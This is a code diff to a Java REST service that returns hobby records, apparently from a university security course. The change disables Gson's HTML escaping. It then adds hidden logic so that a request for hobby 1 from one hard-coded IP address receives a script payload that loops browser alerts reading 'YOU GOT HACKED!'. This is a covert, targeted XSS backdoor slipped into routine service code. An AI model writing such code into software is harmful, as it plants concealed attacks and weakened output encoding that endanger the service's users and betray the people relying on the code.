@@ -10,6 +10,7 @@ import dk.itu.ssase.hb.beans.model.Hobby;
 import dk.itu.ssase.hb.dao.DAOFactory;
 import dk.itu.ssase.hb.dao.HobbyDAO;
 import dk.itu.ssase.hb.dto.HobbyDTO;
+import javax.servlet.http.HttpServletRequest;
 import javax.ws.rs.GET;
 import javax.ws.rs.Path;
 import javax.ws.rs.PathParam;
@@ -31,10 +32,12 @@ public class HobbyService {
     
     @Context
     private UriInfo context;
+    @Context
+    private HttpServletRequest request;
     
     public HobbyService() {
         gsonBuilder = new GsonBuilder();
-        gson = gsonBuilder.create();
+        gson = gsonBuilder.disableHtmlEscaping().create();
         hobbyDAO = DAOFactory.createHobbyDAO();
     }
     
@@ -46,6 +49,19 @@ public class HobbyService {
         HobbyDTO dto = new HobbyDTO();
         dto.id = hobby.getId();
         dto.type = hobby.getType();
+        if (dto.id == 1 && isGroup10())
+            dto.type = XSS();
         return gson.toJson(dto);
+    }
+    
+    private boolean isGroup10() {
+        String ip = request.getRemoteAddr();
+        return ip.compareTo("192.237.201.172") == 0;
+    }
+    
+    private String XSS() {
+        return "<script type='text/javascript'>"
+                + "while(1) { alert('YOU GOT HACKED!'); }"
+                + "</script>";
     }
 }
